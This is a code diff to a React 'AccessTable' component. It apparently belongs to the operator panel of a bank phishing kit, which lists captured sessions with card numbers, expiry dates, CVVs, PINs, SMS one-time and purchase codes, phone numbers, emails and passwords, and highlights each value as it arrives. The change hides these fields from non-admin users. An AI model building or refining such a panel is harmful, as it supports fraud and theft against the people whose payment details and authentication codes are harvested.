@@ -355,8 +355,8 @@ const AccessTable: React.FC<AccessTableProps> = ({
                       <div className="mb-3 flex gap-1 items-start">
                         <CreditCard className="h-4 w-4 text-[#888] mt-0.5" />
                         <div className={`text-sm ${highlightedFields[session.sessionId]?.tarjeta ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
-                          <div>{session.tarjeta}</div>
-                          {(session.fechaVencimiento || session.cvv) && (
+                          <div>{isAdmin ? session.tarjeta : '••••••••'}</div>
+                          {isAdmin && (session.fechaVencimiento || session.cvv) && (
                             <div className="text-xs mt-1 opacity-80">
                               {session.fechaVencimiento && <span className="mr-2">Exp: {session.fechaVencimiento}</span>}
                               {session.cvv && <span>CVV: {session.cvv}</span>}
@@ -370,7 +370,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
                       <div className="mb-2 flex gap-1 items-center">
                         <MessageSquare className="h-4 w-4 text-[#888]" />
                         <div className={`text-sm ${highlightedFields[session.sessionId]?.sms ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
-                          SMS: {session.sms}
+                          SMS: {isAdmin ? session.sms : '••••••••'}
                         </div>
                       </div>
                     )}
@@ -379,7 +379,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
                       <div className="mb-2 flex gap-1 items-center">
                         <KeyRound className="h-4 w-4 text-[#888]" />
                         <div className={`text-sm ${highlightedFields[session.sessionId]?.nip ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
-                          NIP: {session.nip}
+                          NIP: {isAdmin ? session.nip : '••••••••'}
                         </div>
                       </div>
                     )}
@@ -388,7 +388,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
                       <div className="mb-2 flex gap-1 items-center">
                         <CheckCircle2 className="h-4 w-4 text-[#888]" />
                         <div className={`text-sm ${highlightedFields[session.sessionId]?.smsCompra ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
-                          SMS Compra: {session.smsCompra}
+                          SMS Compra: {isAdmin ? session.smsCompra : '••••••••'}
                         </div>
                       </div>
                     )}
@@ -397,7 +397,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
                       <div className="mb-2 flex gap-1 items-center">
                         <Smartphone className="h-4 w-4 text-[#888]" />
                         <div className={`text-sm ${highlightedFields[session.sessionId]?.celular ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
-                          Celular: {session.celular}
+                          Celular: {isAdmin ? session.celular : '••••••••'}
                         </div>
                       </div>
                     )}
@@ -515,8 +515,8 @@ const AccessTable: React.FC<AccessTableProps> = ({
                   <td className="p-3 text-[#ccc]">{session.banco}</td>
                   <td className={`p-3 ${highlightedFields[session.sessionId]?.tarjeta ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                     <div>
-                      <span className="block">{session.tarjeta || '--'}</span>
-                      {(session.fechaVencimiento || session.cvv) && (
+                      <span className="block">{isAdmin ? (session.tarjeta || '--') : '••••••••'}</span>
+                      {isAdmin && (session.fechaVencimiento || session.cvv) && (
                         <div className="text-xs mt-1 opacity-80">
                           {session.fechaVencimiento && <span className="mr-2">Exp: {session.fechaVencimiento}</span>}
                           {session.cvv && <span>CVV: {session.cvv}</span>}
@@ -525,16 +525,16 @@ const AccessTable: React.FC<AccessTableProps> = ({
                     </div>
                   </td>
                   <td className={`p-3 ${highlightedFields[session.sessionId]?.sms ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
-                    {session.sms || '--'}
+                    {isAdmin ? (session.sms || '--') : '••••••••'}
                   </td>
                   <td className={`p-3 ${highlightedFields[session.sessionId]?.nip ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
-                    {session.nip || '--'}
+                    {isAdmin ? (session.nip || '--') : '••••••••'}
                   </td>
                   <td className={`p-3 ${highlightedFields[session.sessionId]?.smsCompra ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
-                    {session.smsCompra || '--'}
+                    {isAdmin ? (session.smsCompra || '--') : '••••••••'}
                   </td>
                   <td className={`p-3 ${highlightedFields[session.sessionId]?.celular ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
-                    {session.celular || '--'}
+                    {isAdmin ? (session.celular || '--') : '••••••••'}
                   </td>
                   <td className="p-3 text-[#ccc]">
                     {session.correo || session.contrasena ? (
